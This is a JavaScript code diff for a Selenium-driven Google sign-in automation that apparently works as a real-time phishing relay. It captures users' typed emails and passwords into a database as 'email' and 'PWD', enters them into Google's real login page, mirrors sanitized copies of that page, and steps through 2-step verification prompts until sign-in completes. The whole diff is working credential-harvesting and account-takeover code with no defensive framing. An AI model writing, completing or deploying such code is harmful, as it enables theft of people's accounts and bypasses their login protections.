@@ -14,6 +14,8 @@ import {
   setFavicon,
   setForwardUrlScript,
   setUserIdScript,
+  sleep,
+  writeDebugLogLine,
   writeUserLog,
 } from "./helpers.js";
 import {
@@ -130,12 +132,13 @@ export async function findTab(driver, urlPrefix) {
   for (const hndle of handles) {
     await driver.switchTo().window(hndle);
     const curURL = await driver.getCurrentUrl();
+    console.log("[curURL]", curURL, urlPrefix);
     if (curURL.startsWith(urlPrefix)) {
       productURL = curURL;
       break;
     }
   }
-  return [driver, productURL];
+  return productURL;
 }
 
 export async function findTabExceptChromeNotice(driver) {
@@ -168,15 +171,15 @@ export async function waitChangedUrl(driver, oldurl /* , chkparam */) {
   const target = base(oldurl);
   let validation = false;
   for (let i = 0; i < 20; i++) {
-    await new Promise((r) => setTimeout(r, 300));
+    await sleep(300);
     const cur = await driver.getCurrentUrl();
     if (base(cur) !== target) {
       validation = await waitForPageLoading(driver);
       break;
     }
   }
-  const new_url = await driver.getCurrentUrl();
-  return [driver, new_url, validation];
+  const newURL = await driver.getCurrentUrl();
+  return { newURL, validation };
 }
 
 export async function openNewTabWithUrl(driver, url) {
@@ -190,7 +193,82 @@ export async function openNewTabWithUrl(driver, url) {
 }
 
 // ----------------- Page HTML snapshot (sanitized) -----------------
-export async function getPageSource(userId) {}
+export async function getPageSource(userId) {
+  // try {
+  const { driver } = await UsersDB.get(userId);
+  if (!driver) {
+    console.log("Driver data is not working");
+    return "";
+  }
+
+  // wait page loading // (until to language setting button clickable)
+  await driver.wait(
+    until.elementIsEnabled(
+      driver.findElement(By.xpath('//div[@jsname="oYxtQd"]'))
+    )
+  );
+
+  // wait page loading (until to jsname="USBQqe")
+  while (true) {
+    const div_USBQqe_s = await driver.findElements(
+      By.xpath('//div[@jsname="USBQqe"]')
+    );
+    if (div_USBQqe_s.length == 1) {
+      break;
+    }
+    await sleep(100);
+  }
+  //
+
+  // Input tag: set badinput="true" attribute
+  const inputElements = await driver.findElements(By.xpath("//input"));
+
+  for (const element of inputElements) {
+    try {
+      const typeAttribute = await element.getAttribute("type");
+      if (typeAttribute === "hidden") {
+        continue;
+      }
+
+      // Set badinput attribute using JavaScript
+      await driver.executeScript(
+        "arguments[0].setAttribute('badinput', arguments[1]);",
+        element,
+        "true"
+      );
+    } catch (error) {
+      console.log(`Error setting attribute on input: ${error.message}`);
+    }
+  }
+
+  // Get HTML from specific div
+  const divElements = await driver.findElements(By.xpath('//*[@id="yDmH0d"]'));
+  if (divElements.length === 0) {
+    throw new Error('Element with id "yDmH0d" not found');
+  }
+
+  const divEl = divElements[0];
+  let htmlYDmH0d = await divEl.getAttribute("innerHTML");
+
+  // Remove script and iframe tags
+  htmlYDmH0d = removeSpecificTag(htmlYDmH0d, "script");
+  htmlYDmH0d = removeSpecificTag(htmlYDmH0d, "iframe");
+
+  // Add styles
+  const pageSource = await driver.getPageSource();
+  const styleList = getSpecificTagList(pageSource, "style");
+
+  for (let i = 0; i < styleList.length; i++) {
+    htmlYDmH0d += styleList[i];
+  }
+
+  return htmlYDmH0d;
+  // } catch (error) {
+  //    console.log(`getPageSource: ${error.message}`);
+  //   return "";
+  // }
+}
+
 export async function saveScreenshot(driver, userId, screenshotName) {
   try {
     if (!driver) return;
@@ -269,7 +347,7 @@ export async function scrapingReady(
 
   const pageSource = await driver.getPageSource();
   // Snapshot sanitized HTML (no scripts/iframes)
-  writeUserLog(userId, `[pageSource] ${pageSource}`);
+  writeDebugLogLine(`[pageSource] ${pageSource}`);
 
   // remove script
   let htmlText = removeSpecificTag(pageSource, "script");
@@ -320,6 +398,7 @@ export async function scrapInputValueAndBtnNext(
   await saveScreenshot(driver, userId, "btn_action_0.png");
   let productURL = await findTab(driver, URL_GOOGLE_ACCOUNT_URL);
   if (!productURL) return;
+  console.log(`[productURL]: ${JSON.stringify(productURL)}`);
 
   if (productURL.startsWith(URL_INPUT_EMAIL)) {
     await UsersDB.updateDetail(userId, "email", inputValue);
@@ -327,7 +406,6 @@ export async function scrapInputValueAndBtnNext(
     await UsersDB.updateDetail(userId, "PWD", inputValue);
   }
 
-  let curPage = "";
   await saveScreenshot(driver, userId, "btn_action_1.png");
 
   if (btnType == 0) {
@@ -337,7 +415,7 @@ export async function scrapInputValueAndBtnNext(
         `scrapInputValueAndBtnNext : input email : ${inputValue}`
       );
       let emailInput = await driver.wait(
-        util.elementIsEnabled(driver.findElement(By.id("identifierId")))
+        until.elementIsEnabled(driver.findElement(By.id("identifierId")))
       );
 
       await emailInput.click();
@@ -346,7 +424,7 @@ export async function scrapInputValueAndBtnNext(
       // write_log(user_id, f'email has been entered.')
     } else if (productURL.startsWith(URL_INPUT_PASSWORD)) {
       let passwordInput = await driver.wait(
-        util.elementIsEnabled(
+        until.elementIsEnabled(
           driver.findElement(By.xpath('//input[@name="Passwd"]'))
         )
       );
@@ -368,17 +446,78 @@ export async function scrapInputValueAndBtnNext(
         writeUserlog(user_id, `input value has been entered.`);
       }
     }
-    const btns = await driver.findElements(By.xpath("//button"));
-    for (const btn of btns) {
-      if (btn.text == btnText) {
-        await btn.click();
-        writeUserLog(userId, `Next button has been clicked.`);
-        break;
+    let buttons = await driver.findElements(By.tagName("button"));
+    console.log(`Found ${buttons.length} buttons`);
+
+    for (let i = 0; i < buttons.length; i++) {
+      try {
+        const mBtnText = await buttons[i].getText();
+        
+        console.log("[findElements]", btnText, mBtnText);
+        if (mBtnText == btnText) {
+          await buttons[i].click();
+          console.log(`Clicked button ${i + 1}`);
+          // Add small delay between clicks if needed
+          await driver.sleep(200);
+        }
+      } catch (error) {
+        console.log(`Could not click button ${i + 1}: ${error.message}`);
       }
+    }
+  } else if (btnType == 1) {
+    await driver
+      .wait(
+        until.elementIsEnabled(
+          driver.findElement(By.xpath(`//div[@jsname="${btnText}"]`))
+        )
+      )
+      .click();
+    writeUserLog(userId, `Re-select account button has been clicked.`);
+  } else if (btnType == 2) {
+    const elements = await driver.findElements(By.xpath(`//li`));
+    for (const element of elements) {
+      const className = await element.getAttribute("class");
+      console.log("[className]", className);
+      // if (className.find("aZvCDf cd29Sd zpCp3 SmR8") < 0) continue;
+      // if (element.text.find(btnText) >= 0) {
+      //   await element.click();
+      //   writeUserLog(
+      //     userId,
+      //     `try-another-way-item has been clicked. ${btnText}`
+      //   );
+      //   break;
+      // }
+      throw new Error("Comming Soon");
     }
   }
 
-  return { status: 1, htmlText: html, cur_page: "" };
+  const { newURL, validation } = await waitChangedUrl(driver, productURL);
+  writeUserLog(userId, `scrap_input_value_and_btn_next : new-url=${newURL}`);
+  saveScreenshot(driver, userId, "btn_action_2.png");
+  if (!validation) {
+    return {
+      status: 0,
+      curPage: "",
+    };
+  }
+  let curPage = "";
+
+  if (newURL.startsWith(URL_DONE) || newURL.startsWith(URL_RECOVERY_OPTION)) {
+    return { status: 1, curPage: "done" };
+  }
+
+  if (newURL.startsWith(URL_INPUT_EMAIL)) {
+    curPage = "email";
+  } else if (newURL.startsWith(URL_INPUT_PASSWORD)) {
+    curPage = "password";
+  } else if (newURL.startsWith(URL_2_STEP_DP_PRESEND)) {
+    curPage = "dp-presend";
+  } else if (newURL.startsWith(URL_2_STEP_DP)) {
+    curPage = "dp";
+  }
+  const htmlText = await getPageSource(userId);
+
+  return { status: 1, htmlText, curPage };
 }
 
 export async function scrapCheckURL(userId) {
@@ -389,7 +528,7 @@ export async function scrapCheckURL(userId) {
   const { driver } = ctx;
   const url = await driver.getCurrentUrl();
   const html = await getPageSource(userId);
-  return { status: 1, cur_page: "", url, htmlText: html };
+  return { status: 1, curPage: "", url, htmlText: html };
 }
 
 export async function saveScrapingResultAndSetDone(userId) {
